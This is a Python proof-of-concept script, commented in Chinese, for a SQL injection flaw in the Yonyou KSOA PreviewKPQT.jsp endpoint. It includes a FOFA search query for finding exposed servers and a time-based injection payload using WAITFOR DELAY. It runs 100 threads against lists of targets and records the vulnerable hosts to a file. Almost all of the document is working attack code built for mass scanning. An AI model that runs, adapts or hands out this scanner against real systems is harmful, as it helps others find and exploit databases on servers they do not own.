#用友时空KSOA_PreviewKPQT_SQL注入漏洞
#fofa:product="用友-时空KSOA"

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
██╗  ██╗███████╗ ██████╗  █████╗         ██████╗ ██████╗ ███████╗██╗   ██╗██╗███████╗██╗    ██╗██╗  ██╗██████╗  ██████╗ ████████╗     ███████╗ ██████╗ ██╗     
██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗        ██╔══██╗██╔══██╗██╔════╝██║   ██║██║██╔════╝██║    ██║██║ ██╔╝██╔══██╗██╔═══██╗╚══██╔══╝     ██╔════╝██╔═══██╗██║     
█████╔╝ ███████╗██║   ██║███████║        ██████╔╝██████╔╝█████╗  ██║   ██║██║█████╗  ██║ █╗ ██║█████╔╝ ██████╔╝██║   ██║   ██║        ███████╗██║   ██║██║     
██╔═██╗ ╚════██║██║   ██║██╔══██║        ██╔═══╝ ██╔══██╗██╔══╝  ╚██╗ ██╔╝██║██╔══╝  ██║███╗██║██╔═██╗ ██╔═══╝ ██║▄▄ ██║   ██║        ╚════██║██║▄▄ ██║██║     
██║  ██╗███████║╚██████╔╝██║  ██║███████╗██║     ██║  ██║███████╗ ╚████╔╝ ██║███████╗╚███╔███╔╝██║  ██╗██║     ╚██████╔╝   ██║███████╗███████║╚██████╔╝███████╗
╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝      ╚══▀▀═╝    ╚═╝╚══════╝╚══════╝ ╚══▀▀═╝ ╚══════╝
                                                                                                                                                                                                                                                                                                                                                    
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="用友时空KSOA_PreviewKPQT_SQL注入漏洞")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload1 = "/kp/PreviewKPQT.jsp?KPQTID=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--"
    payload2 = "/kp/PreviewKPQT.jsp?KPQTID=1"
    headers = {
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36',
        'Connection':'close'
        
    }
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.get(url=target+payload1,headers=headers,verify=False,proxies=proxies)
        res2 = requests.get(url=target+payload2,headers=headers,verify=False,proxies=proxies)
        time1 = res1.elapsed.total_seconds()
        time2 = res2.elapsed.total_seconds()
        if time1-time2>=4:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()